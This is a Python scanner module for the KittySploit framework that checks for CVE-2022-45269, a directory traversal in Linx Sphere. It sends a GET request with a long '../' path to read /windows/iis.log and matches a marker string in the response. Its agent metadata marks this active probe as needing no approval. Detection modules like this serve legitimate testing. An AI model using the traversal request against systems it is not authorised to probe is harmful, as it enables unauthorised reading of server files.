#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in the component SCS."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Linx Sphere - Directory Traversal Detection',
        'description': 'A directory traversal vulnerability in the component SCS.Web.Server.SPI/1.0 of Linx Sphere LINX 7.35.ST15 allows attackers to read arbitrary files.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'linx', 'lfi', 'scs', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2022-45269'],
        'cve': 'CVE-2022-45269',
    }

    def run(self):
        r = self.http_request(method="GET", path='/../../../../../../../../../../../../windows/iis.log', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Component Based Setup',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="Linx Sphere - Directory Traversal detected",
                path='/../../../../../../../../../../../../windows/iis.log',
            )
            return True
        return False

